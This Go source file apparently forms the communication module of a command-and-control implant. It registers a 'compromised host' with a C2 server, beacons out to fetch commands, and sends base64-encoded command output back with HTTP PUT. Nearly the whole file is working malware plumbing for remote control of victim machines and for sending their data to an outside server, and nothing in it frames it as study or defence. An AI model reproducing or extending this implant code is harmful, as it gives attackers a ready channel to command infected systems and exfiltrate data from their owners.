package main

import (
	"bytes"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"net/http"
	"strconv"
)

func register(c2url string) *API_Device {
	// Collect info about compromised host
	apiDevice := &API_Device{
		Id:                    0,
		Hostname:              "",
		InternalIp:            "",
		ExternalIp:            "",
		Mac:                   "",
		Domain:                "",
		Username:              "scott",
		Pid:                   0,
		Os:                    "",
		Arch:                  "",
		BeaconPeriod:          700,
		BeaconJitter:          700,
		BeaconTimestampLast:   0,
		BeaconTimestampJoined: 0,
	}
	apiDeviceJson, _ := json.Marshal(apiDevice)
	postBody := bytes.NewBuffer(apiDeviceJson)

	// Send /register HTTP POST request
	client := &http.Client{}
	req, _ := http.NewRequest("POST", c2url+"/"+apiVersion+"/register", postBody)
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("X-ApiKey", apiKey)
	resp, err := client.Do(req)
	if err != nil || resp.StatusCode != 200 {
		fmt.Println(err)
	}
	respBytes, _ := ioutil.ReadAll(resp.Body)
	json.Unmarshal(respBytes, apiDevice)

	return apiDevice
}

func request(apiDevice *API_Device) *API_Command {
	// beacon out to C2 server
	client := &http.Client{}
	id := strconv.Itoa(apiDevice.Id)
	req, _ := http.NewRequest("GET", c2url+"/"+apiVersion+"/c2_request/"+id, nil)
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("X-ApiKey", apiKey)
	resp, err := client.Do(req)
	if err != nil || resp.StatusCode != 200 {
		respBytes, _ := ioutil.ReadAll(resp.Body)
		fmt.Println(string(respBytes))
	}

	// Read response for a "new" command
	respBytes, _ := ioutil.ReadAll(resp.Body)
	var data map[string]interface{}
	_ = json.Unmarshal(respBytes, &data)

	if data["status"] == "info" {
		return nil
	} else {
		var apiCommand *API_Command
		json.Unmarshal(respBytes, &apiCommand)
		return apiCommand
	}
}

func response(output string, apiCommand *API_Command, apiDevice *API_Device) {
	outputB64 := base64.StdEncoding.EncodeToString([]byte(output))
	apiCommand.Response = outputB64

	apiCommandJson, _ := json.Marshal(apiCommand)
	fmt.Println(string(apiCommandJson))
	postBody := bytes.NewBuffer(apiCommandJson)

	id := strconv.Itoa(apiDevice.Id)

	client := &http.Client{}
	req, _ := http.NewRequest("PUT", c2url+"/"+apiVersion+"/c2_response/"+id, postBody)
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("X-ApiKey", apiKey)
	resp, err := client.Do(req)
	if err != nil || resp.StatusCode != 200 {
		fmt.Println(err)
	}
}
